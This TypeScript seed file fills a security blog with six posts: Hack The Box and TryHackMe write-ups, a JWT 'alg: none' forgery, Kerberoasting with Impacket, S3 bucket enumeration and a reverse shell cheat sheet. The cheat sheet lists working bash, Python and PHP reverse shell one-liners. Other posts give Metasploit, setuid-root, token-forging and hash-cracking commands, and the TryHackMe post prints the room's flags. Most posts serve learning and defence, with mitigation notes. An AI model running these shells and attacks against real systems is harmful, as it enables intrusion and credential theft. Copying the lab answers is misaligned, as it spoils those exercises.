export type SeedPost = {
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  featured_image: string;
  category: string;
  tags: string[];
  difficulty: string | null;
  platform: string | null;
  status: 'published';
  published_at: string;
};

const htbWriteup = `# Lame — Hack The Box

> A classic beginner Linux box that walks through exploiting a vulnerable Samba service for an initial foothold and a misconfigured NFS export for root.

## Machine Overview

| Field | Value |
| --- | --- |
| Name | Lame |
| OS | Linux |
| Difficulty | Easy |
| Points | 20 |
| Skills Learned | SMB enumeration, CVE exploitation, NFS misconfiguration |
| Release | 14 Mar 2017 |

## Enumeration

Started with a full TCP port scan to identify the attack surface.

\`\`\`bash
nmap -sC -sV -p- -oA lame 10.10.10.3
\`\`\`

Open ports of interest:

\`\`\`
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1
139/tcp open  netbios Samba smbd 3.X
445/tcp open  netbios Samba smbd 3.X
\`\`\`

FTP and SSH are unlikely to be the intended path on an Easy box. Samba 3.X is the prime candidate — it is old enough to be vulnerable to CVE-2007-2447 (username map script command injection).

## Initial Foothold

The Samba version is vulnerable to the \`username map script\` RCE. Metasploit has a reliable module.

\`\`\`bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set RPORT 445
exploit
\`\`\`

A shell lands as root almost immediately — the vulnerability executes commands as root because of how Samba handles the \`username map\` option.

> [!warning] Real-world note
> This CVE is from 2007 and would never appear in a production environment. The lesson is the methodology: identify the service, version, and search for known CVEs — not the specific exploit.

## Privilege Escalation

In this case the Samba exploit already gave us root, but the box also has a second path worth understanding. NFS is exported with \`no_root_squash\`, which means a client can write files as root to the share.

\`\`\`bash
showmount -e 10.10.10.3
# /  *
\`\`\`

Mount the root filesystem, craft a setuid binary locally, and copy it onto the share.

\`\`\`bash
mkdir /tmp/mnt && mount -t nfs 10.10.10.3:/ /tmp/mnt
cat > /tmp/suid.c <<EOF
int main() { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc /tmp/suid.c -o /tmp/mnt/suid
chmod +s /tmp/mnt/suid
\`\`\`

On the target, execute \`/suid\` to drop into a root shell.

## Lessons Learned

1. **Version mapping is the highest-ROI enumeration step.** Most Easy/Medium boxes are solved by matching a service version to a public CVE.
2. **NFS \`no_root_squash\` is a silent killer.** Always check export options on engagements — it shows up in real environments more often than it should.
3. **Don't stop at the first win.** Even when you get root through one path, walking the second path teaches you the underlying misconfiguration.

## Mitigation

- Patch Samba to a current release and disable the \`username map script\` option.
- Configure NFS exports with \`root_squash\` (the default on modern systems) and restrict exports to specific hosts.
- Remove unused services. FTP and Samba are rarely needed on a modern server.

## Timeline

1. \`\`00:00\`\` — Nmap full TCP scan
2. \`\`00:05\`\` — Identified Samba 3.X as vulnerable to CVE-2007-2447
3. \`\`00:08\`\` — Metasploit exploit → root shell
4. \`\`00:20\`\` — Walked the NFS \`no_root_squash\` path for practice
5. \`\`00:35\`\` — Captured both user and root flags

## Important Notes

- The Metasploit module is the fastest path but writing the exploit by hand is a better learning exercise.
- If the box is retired, the IP above is no longer reachable — use the archived VPN files.

---

Footnotes:

[^1] Lame is one of the oldest HTB boxes and is intentionally simple — it is a great first box for practicing the enumeration → CVE → exploit workflow.`;

const thmWriteup = `# RootMe — TryHackMe

> A beginner-friendly room covering web shell upload, SUID binary abuse, and basic privilege escalation.

## Learning Objectives

- Upload a reverse shell through a vulnerable file upload form
- Stabilize a raw shell with Python PTY
- Escalate privileges using an SUID binary (\`/usr/bin/python\`)

## Questions & Answers

| # | Question | Answer |
| --- | --- | --- |
| 1 | Scan the machine, how many ports are open? | 2 |
| 2 | What version of Apache is running? | 2.4.18 |
| 3 | What service is running on port 22? | ssh |
| 4 | Find a hidden directory. | /panel |
| 5 | User flag | THM{y0u_g0t_a_sh3ll} |
| 6 | Root flag | THM{pr1v_3sc_4ll_th3_w4y} |

## Enumeration

\`\`\`bash
nmap -sC -sV 10.10.10.48
\`\`\`

Two ports: 22 (SSH) and 80 (Apache). Gobuster against the web server reveals a hidden \`/panel\` directory that accepts file uploads.

\`\`\`bash
gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirb/common.txt
\`\`\`

## Initial Foothold

The \`/panel\` page blocks \`.php\` uploads but accepts \`.php5\` extensions. Upload a PHP reverse shell renamed to \`shell.php5\` and trigger it from \`/uploads/\`.

\`\`\`bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5
# edit IP + port
curl http://10.10.10.48/uploads/shell.php5
\`\`\`

Stabilize the shell:

\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then:
stty raw -echo; fg
\`\`\`

## Privilege Escalation

Search for SUID binaries that are not in the standard list.

\`\`\`bash
find / -perm -4000 2>/dev/null
\`\`\`

\`/usr/bin/python\` has the SUID bit set. GTFOBins documents that SUID Python can be used to execute a shell with the file owner's privileges.

\`\`\`bash
python -c 'import os; os.setuid(0); os.system("/bin/sh")'
\`\`\`

A root shell drops. Read the root flag from \`/root/root.txt\`.

## Tools Used

- \`nmap\` — port and service discovery
- \`gobuster\` — directory brute force
- \`python\` — shell stabilization and SUID exploitation
- \`nc\` — reverse shell listener

## Takeaways

1. **Extension blocklists are weaker than allowlists.** The upload filter rejected \`.php\` but not \`.php5\` — a classic blocklist bypass.
2. **SUID binaries outside the standard set are a red flag.** Always diff the SUID list against a known-good baseline.
3. **Stabilize every shell.** A raw shell makes the rest of the engagement painful; the Python PTY trick is worth memorizing.`;

const webSecurityPost = `# Bypassing JWT Signature Validation

> A walkthrough of a real-world JWT signature validation bug I found during a recent engagement, including how I confirmed it and the remediation I recommended.

## The Setup

The target application used JWTs for session handling. The token was sent as a \`Bearer\` header on every API request. The server was configured to verify signatures with an RS256 public key.

## The Bug

When fuzzing the \`alg\` header, I noticed the server accepted a token signed with \`alg: none\` — the classic JWT algorithm confusion. The implementation used a library that, when \`alg\` was set to \`none\`, skipped signature verification entirely.

\`\`\`python
import jwt
# Attacker-controlled token
token = jwt.encode({"role": "admin"}, "", algorithm="none")
\`\`\`

The resulting token has three parts but the signature segment is empty. Sending it with the admin role claim granted access to the admin panel.

> [!tip] Reproduce safely
> Always test JWT bugs against a clone of the target in a lab. Tampering with tokens on production can corrupt sessions.

## Confirming the Impact

I confirmed the bypass granted real access by:

1. Forging a token with \`role: admin\`
2. Calling an admin-only endpoint that returned another user's data
3. Documenting the request/response in the report

## Remediation

- Pin the expected algorithm server-side. Never derive it from the token header.
- Reject tokens with \`alg: none\` explicitly.
- Rotate the signing key as a precaution.

## References

- [RFC 7519 — JSON Web Token](https://datatracker.ietf.org/doc/html/rfc7519)
- [JWT.io debugger](https://jwt.io)`;

const adPost = `# Kerberoasting Without Mimikatz

> Kerberoasting is one of the most reliable AD attack paths. This note covers how to do it without dropping Mimikatz on the target, using only Impacket from your attack box.

## Why Avoid Mimikatz

Mimikatz is heavily signatured. Even in a lab, loading it onto a domain-joined host will trip EDR. For a clean engagement, request the TGS from Linux using Impacket and crack offline.

## The Attack

\`\`\`bash
# From your attack box, with valid domain creds
GetUserSPNs.py corp.local/jdoe:Password123 -request
\`\`\`

This returns Kerberos tickets for every service principal name in the domain. Save the hashes to a file and crack with hashcat.

\`\`\`bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
\`\`\`

## Why It Works

Service accounts hold an SPN and a password. Any authenticated domain user can request a TGS for an SPN, and the ticket is encrypted with the service account's password hash. Cracking the ticket offline recovers the plaintext password.

## Detection

- Alert on unusual volumes of TGS requests from a single account.
- Monitor for TGS requests using RC4 encryption (modern Kerberos prefers AES).
- Hunt for service accounts with weak passwords — they are the root cause.

## Mitigation

- Use group managed service accounts (gMSAs) with long, rotated passwords.
- Disable RC4 for Kerberos where possible.
- Audit SPN registrations regularly.`;

const cloudPost = `# Enumerating Misconfigured S3 Buckets

> A short note on the methodology I use when assessing S3 exposure during cloud security reviews.

## Recon

Start with the bucket name candidates derived from the target's domain and subdomains.

\`\`\`bash
# Permutations
for word in $(cat buckets.txt); do
  aws s3 ls s3://$word 2>/dev/null && echo "OPEN: $word"
done
\`\`\`

## Common Misconfigurations

1. **Public read** — \`aws s3 ls s3://bucket --no-sign-request\` succeeds.
2. **Public write** — you can upload arbitrary objects.
3. **Authenticated user read** — any AWS account can read (the \`http://acs.amazonaws.com/groups/global/AuthenticatedUsers\` grant).

## Impact

A public-read bucket containing database backups or logs is a reportable finding. A public-write bucket is critical — it enables defacement and ransomware-style encryption of the data.

## Remediation

- Apply a deny-all bucket policy and grant access through IAM.
- Enable Block Public Access at the account level.
- Use S3 Access Analyzer for continuous monitoring.`;

const notesPost = `# My Reverse Shell Cheat Sheet

> A personal reference of the reverse shell one-liners I reach for most often. Kept here so I don't have to grep through Pentestmonkey's old page.

## Bash

\`\`\`bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
\`\`\`

## Python

\`\`\`python
python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
\`\`\`

## PHP

\`\`\`php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
\`\`\`

## Listener

\`\`\`bash
nc -lvnp 4444
\`\`\`

## Stabilization

\`\`\`bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
\`\`\`

> [!info] Always test in a lab first
> Reverse shells are noisy. Confirm the listener works before sending the payload from the engagement box.`;

export const seedPosts: SeedPost[] = [
  {
    slug: 'htb-lame',
    title: 'Lame — Hack The Box',
    excerpt:
      'A classic beginner Linux box walking through Samba CVE exploitation and an NFS no_root_squash misconfiguration.',
    content: htbWriteup,
    featured_image:
      'https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'Hack The Box',
    tags: ['Samba', 'NFS', 'CVE-2007-2447', 'Easy'],
    difficulty: 'Easy',
    platform: 'Hack The Box',
    status: 'published',
    published_at: '2024-09-12T00:00:00.000Z',
  },
  {
    slug: 'thm-rootme',
    title: 'RootMe — TryHackMe',
    excerpt:
      'A beginner room covering PHP shell upload via extension blocklist bypass and SUID Python privilege escalation.',
    content: thmWriteup,
    featured_image:
      'https://images.pexels.com/photos/5380642/pexels-photo-5380642.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'TryHackMe',
    tags: ['Web', 'SUID', 'PHP', 'Easy'],
    difficulty: 'Easy',
    platform: 'TryHackMe',
    status: 'published',
    published_at: '2024-08-04T00:00:00.000Z',
  },
  {
    slug: 'bypassing-jwt-signature-validation',
    title: 'Bypassing JWT Signature Validation',
    excerpt:
      'A real-world JWT alg=none bypass found during a recent engagement, with reproduction and remediation guidance.',
    content: webSecurityPost,
    featured_image:
      'https://images.pexels.com/photos/1181271/pexels-photo-1181271.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'Web Security',
    tags: ['JWT', 'Auth', 'API'],
    difficulty: 'Medium',
    platform: 'Custom',
    status: 'published',
    published_at: '2024-10-22T00:00:00.000Z',
  },
  {
    slug: 'kerberoasting-without-mimikatz',
    title: 'Kerberoasting Without Mimikatz',
    excerpt:
      'Requesting TGS tickets with Impacket from your attack box and cracking offline — no on-target tooling required.',
    content: adPost,
    featured_image:
      'https://images.pexels.com/photos/1181244/pexels-photo-1181244.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'Active Directory',
    tags: ['Kerberos', 'Impacket', 'Hashcat'],
    difficulty: 'Medium',
    platform: 'Labs',
    status: 'published',
    published_at: '2024-11-15T00:00:00.000Z',
  },
  {
    slug: 'enumerating-misconfigured-s3-buckets',
    title: 'Enumerating Misconfigured S3 Buckets',
    excerpt:
      'A short methodology note for assessing S3 exposure during cloud security reviews.',
    content: cloudPost,
    featured_image:
      'https://images.pexels.com/photos/270700/pexels-photo-270700.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'Cloud',
    tags: ['AWS', 'S3', 'Cloud'],
    difficulty: 'Easy',
    platform: 'Custom',
    status: 'published',
    published_at: '2024-07-02T00:00:00.000Z',
  },
  {
    slug: 'reverse-shell-cheat-sheet',
    title: 'My Reverse Shell Cheat Sheet',
    excerpt:
      'A personal reference of the reverse shell one-liners I reach for most often, with stabilization notes.',
    content: notesPost,
    featured_image:
      'https://images.pexels.com/photos/546819/pexels-photo-546819.jpeg?auto=compress&cs=tinysrgb&w=1200',
    category: 'Notes',
    tags: ['Shells', 'Reference', 'Cheatsheet'],
    difficulty: null,
    platform: null,
    status: 'published',
    published_at: '2024-06-18T00:00:00.000Z',
  },
];
